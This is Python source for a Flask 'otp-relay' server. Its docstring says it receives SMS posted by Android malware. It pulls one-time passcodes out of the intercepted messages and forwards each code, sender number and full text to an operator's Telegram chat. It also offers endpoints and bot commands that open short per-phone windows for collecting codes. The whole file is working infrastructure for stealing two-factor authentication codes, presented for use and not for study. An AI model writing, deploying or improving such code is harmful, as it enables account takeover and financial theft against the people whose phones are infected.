import os, re, time, threading
from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
CHAT_ID   = os.environ.get("CHAT_ID", "")
ADMIN_SECRET = os.environ.get("ADMIN_SECRET", "changeme")  # simple gate

# phone -> {expires, codes}
sessions = {}
OTP_RE = re.compile(r"\b(\d{4,8})\b")

def tg(text):
    if not BOT_TOKEN or not CHAT_ID:
        return
    try:
        requests.get(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            params={"chat_id": CHAT_ID, "text": text},
            timeout=10
        )
    except Exception:
        pass

@app.get("/")
def home():
    return "otp-relay online"

@app.post("/sms")
def sms_in():
    """Android malware / Redner / any hook posts here"""
    data = request.get_json(force=True, silent=True) or {}
    # also accept form
    if not data:
        data = request.form.to_dict() or {}
    phone = str(data.get("phone") or data.get("from") or data.get("number") or "")
    text  = str(data.get("text") or data.get("full") or data.get("message") or data.get("body") or "")
    otp   = str(data.get("otp") or "")
    if not otp:
        found = OTP_RE.findall(text)
        otp = found[0] if found else ""
    # session label match optional
    msg = f"OTP: {otp}\nFrom: {phone}\nFull: {text}"
    tg(msg)
    # store short window
    if phone:
        sessions[phone] = {
            "expires": time.time() + 60,
            "codes": list(set((sessions.get(phone) or {}).get("codes", []) + ([otp] if otp else [])))
        }
    return jsonify({"ok": True, "otp": otp})

@app.get("/sms")
def sms_get():
    """simple GET hook: /sms?phone=...&text=..."""
    phone = request.args.get("phone", "")
    text  = request.args.get("text", "")
    otp_m = OTP_RE.findall(text)
    otp = otp_m[0] if otp_m else ""
    tg(f"OTP: {otp}\nFrom: {phone}\nFull: {text}")
    return jsonify({"ok": True, "otp": otp})

@app.post("/listen")
def listen():
    """arm 50s window label: {"phone":"+1...","ttl":50}"""
    data = request.get_json(force=True, silent=True) or {}
    phone = str(data.get("phone", "")).strip()
    ttl = int(data.get("ttl", 50))
    if not phone:
        return jsonify({"error": "phone required"}), 400
    sessions[phone] = {"expires": time.time() + ttl, "codes": []}
    tg(f"Listening {phone} for {ttl}s")
    return jsonify({"ok": True, "phone": phone, "ttl": ttl})

@app.get("/codes/<path:phone>")
def codes(phone):
    s = sessions.get(phone) or sessions.get("+" + phone)
    if not s or time.time() > s["expires"]:
        return jsonify({"codes": [], "active": False})
    return jsonify({"codes": s.get("codes", []), "active": True})

@app.post("/tg")
def tg_webhook():
    """optional: set Telegram webhook to this later for /get commands"""
    update = request.get_json(force=True, silent=True) or {}
    msg = update.get("message") or {}
    chat = str((msg.get("chat") or {}).get("id", ""))
    text = (msg.get("text") or "").strip()
    if not text:
        return jsonify({"ok": True})
    if text.startswith("/start"):
        tg("Send /get +number  or POST SMS to /sms")
    elif text.startswith("/get"):
        parts = text.split(maxsplit=1)
        phone = parts[1].strip() if len(parts) > 1 else ""
        if phone:
            sessions[phone] = {"expires": time.time() + 50, "codes": []}
            tg(f"50s window on {phone} — waiting for /sms posts")
        else:
            tg("Usage: /get +15551234567")
    elif text.startswith("/id"):
        tg(f"Your chat id: {chat}")
    return jsonify({"ok": True})

@app.get("/health")
def health():
    return jsonify({"status": "up", "sessions": len(sessions)})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
